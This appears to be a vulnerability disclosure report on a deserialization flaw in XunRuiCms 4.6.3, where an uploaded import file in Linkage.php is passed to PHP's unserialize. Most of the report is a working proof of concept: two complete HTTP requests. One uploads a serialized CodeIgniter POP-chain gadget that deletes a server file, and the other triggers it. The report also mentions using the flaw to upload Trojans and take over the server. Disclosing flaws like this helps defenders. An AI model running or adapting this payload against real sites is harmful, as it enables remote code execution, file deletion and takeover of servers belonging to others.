# XunRuiCms has deserialization  and code excute vulnerability.

## supplier 
https://gitee.com/dayrui/xunruicms/archive/refs/tags/4.6.3.zip
## Vulnerability file
Linkage.php

## describe

There is a deserialization vulnerability in the latest version of Xunrui CMS gitee release, which can execute code and construct POP chains according to the purpose of exploitation, such as RCE chains, execute system commands. A malicious attacker is able to gain privileges on the server.

**Code analysis**    

upload file, and get the content of the file and pass it to the dr_string2array. The content is passed to the unserialize function.Causes code to execute.A malicious attacker is able to gain privileges on the server.

![Image](https://github.com/user-attachments/assets/818ee3e6-525c-4cad-b479-72b7406cf5c5)

![Image](https://github.com/user-attachments/assets/5b954fe5-aa63-49dd-ab3f-ea5951a5143e)

## POC

POC1

```
POST /admin8bb7bf91c8d6.php?c=linkage&m=import_upload&key=1 HTTP/1.1
Host: xunruicms2025
Content-Length: 601
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryA8e80jljbZzkC1lP
Origin: http://xunruicms2025
Referer: http://xunruicms2025/admin8bb7bf91c8d6.php?c=linkage&m=import&key=1&is_iframe=1
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: 37f037ac60e6a7104d81349739852ba3_member_uid=1; 37f037ac60e6a7104d81349739852ba3_member_cookie=c2486e29c0b7f7ce1b6ff520111fb346; csrf_cookie_name=19d383ddd56777a7cf3c3902bc02a4e1; ci_session=uan9r51o16unuor7cpf5h090qnjrkm13
Connection: close

------WebKitFormBoundaryA8e80jljbZzkC1lP
Content-Disposition: form-data; name="csrf_test_name"

19d383ddd56777a7cf3c3902bc02a4e1
------WebKitFormBoundaryA8e80jljbZzkC1lP
Content-Disposition: form-data; name="file_data"; filename="POP.json"
Content-Type: application/json

O:39:"CodeIgniter\\Cache\\Handlers\\RedisHandler":1:{s:5:"redis";O:45:"CodeIgniter\\Session\\Handlers\\MemcachedHandler":2:{s:7:"lockKey";s:8:"pass.txt";s:9:"memcached";O:38:"CodeIgniter\\Cache\\Handlers\\FileHandler":2:{s:6:"prefix";s:10:"E:\\XunRui\\";s:4:"path";s:0:"";}}}
------WebKitFormBoundaryA8e80jljbZzkC1lP--

```

poc2

```
GET /admin8bb7bf91c8d6.php?c=linkage&m=import_add&key=1&page=1 HTTP/1.1
Host: xunruicms2025
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://xunruicms2025/admin8bb7bf91c8d6.php?c=linkage&m=import_add&key=1
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: 37f037ac60e6a7104d81349739852ba3_member_uid=1; 37f037ac60e6a7104d81349739852ba3_member_cookie=c2486e29c0b7f7ce1b6ff520111fb346; csrf_cookie_name=19d383ddd56777a7cf3c3902bc02a4e1; ci_session=uan9r51o16unuor7cpf5h090qnjrkm13
Connection: close


```

**Result**

Obtained system permissions and deleted pass.txt files.

![Image](https://github.com/user-attachments/assets/7249220d-5bf2-4c98-a8d5-f3297ce0dc65)

![Image](https://github.com/user-attachments/assets/07f4ce66-1fbe-441c-be16-aa93749a4b23)

OR use this  vulnerability to upload Trojan files. Obtain server permissions

![Image](https://github.com/user-attachments/assets/4c99ee7a-38e7-439a-9e53-e27d43162201)
